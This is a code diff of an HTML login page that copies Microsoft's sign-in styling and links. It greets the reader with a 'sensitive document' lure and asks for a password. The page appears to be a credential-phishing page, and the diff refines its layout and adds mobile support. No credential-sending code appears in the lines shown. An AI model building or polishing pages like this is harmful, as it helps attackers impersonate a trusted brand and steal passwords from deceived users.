@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Login</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family:"Segoe UI", sans-serif; height:100vh; background:#fff; overflow:hidden; }
@@ -25,7 +26,7 @@ body { font-family:"Segoe UI", sans-serif; height:100vh; background:#fff; overfl
 
 /* LOGIN BOX */
 .login-box {
-  width:400px; min-height:350px; background:#fff; padding:40px; border-radius:12px;
+  width:380px; min-height:350px; background:#fff; padding:40px; border-radius:12px;
   box-shadow:0 12px 28px rgba(0,0,0,0.12);
   position:relative; z-index:50;
   overflow:hidden;
@@ -51,9 +52,7 @@ body { font-family:"Segoe UI", sans-serif; height:100vh; background:#fff; overfl
   80% { transform: translateX(8px); }
   100% { transform: translateX(0); }
 }
-.login-content.shake {
-  animation: shake 0.4s;
-}
+.login-content.shake { animation: shake 0.4s; }
 
 /* LOGO */
 #logo { width:100px; display:block; margin:0 auto 20px; margin-left:10px; }
@@ -71,7 +70,10 @@ body { font-family:"Segoe UI", sans-serif; height:100vh; background:#fff; overfl
 .ms-links a:hover { text-decoration:underline; }
 
 /* NEXT BUTTON */
-.ms-next-btn { background:#0067b8; color:#fff; border:none; padding:12px 34px; font-size:17px; cursor:pointer; float:right; border-radius:0; transition:background 0.2s ease; }
+.ms-next-btn {
+  background:#0067b8; color:#fff; border:none; padding:12px 34px; font-size:17px;
+  cursor:pointer; float:right; border-radius:0; transition:background 0.2s ease;
+}
 .ms-next-btn:hover { background:#005a9e; }
 
 /* ERROR MESSAGE */
@@ -83,6 +85,36 @@ body { font-family:"Segoe UI", sans-serif; height:100vh; background:#fff; overfl
   transition: opacity 0.4s ease;
 }
 #error-msg.show { opacity:1; }
+
+/* --------------------------------------------- */
+/* MOBILE RESPONSIVE FIX */
+/* --------------------------------------------- */
+@media (max-width: 480px) {
+  .login-box {
+    width: 90%;
+    padding: 25px;
+    border-radius: 10px;
+  }
+
+  #logo {
+    width: 75px;
+    margin-bottom: 15px;
+  }
+
+  .input-group input {
+    font-size: 14px;
+  }
+
+  .ms-pass-field {
+    font-size: 14px;
+    padding: 10px;
+  }
+
+  .ms-next-btn {
+    padding: 10px 26px;
+    font-size: 15px;
+  }
+}
 </style>
 </head>
 <body>
@@ -110,11 +142,8 @@ body { font-family:"Segoe UI", sans-serif; height:100vh; background:#fff; overfl
       </div>
 
       <div class="login-header">
-        <!-- Write-up added here -->
         <p style="margin-bottom: 10px; font-weight: normal;">
           You are about to access a sensitive document, so you need to sign in.
-        </p>
-        </p>
         </p>
         
         <b>Enter password</b>
@@ -125,20 +154,23 @@ body { font-family:"Segoe UI", sans-serif; height:100vh; background:#fff; overfl
           <p><a href="https://support.microsoft.com/en-us/account-billing/reset-a-forgotten-microsoft-account-password-eff4f067-5042-c1a3-fe72-b04d60556c37">Can’t access your account?</a></p>
         </div>
 
-        <!-- ERROR MESSAGE -->
         <div id="error-msg"></div>
 
         <button id="login-btn" class="ms-next-btn">Next</button>
       </div>
+
     </div>
   </div>
 </div>
 
 <script>
-
-
 // Intro video fade
+const intro = document.getElementById("intro");
+const introVideo = document.getElementById("introVideo");
+const loginContent = document.getElementById("loginContent");
+
 const videoDuration = 4000;
+
 setTimeout(() => {
   intro.classList.add("fade-out");
   setTimeout(() => {
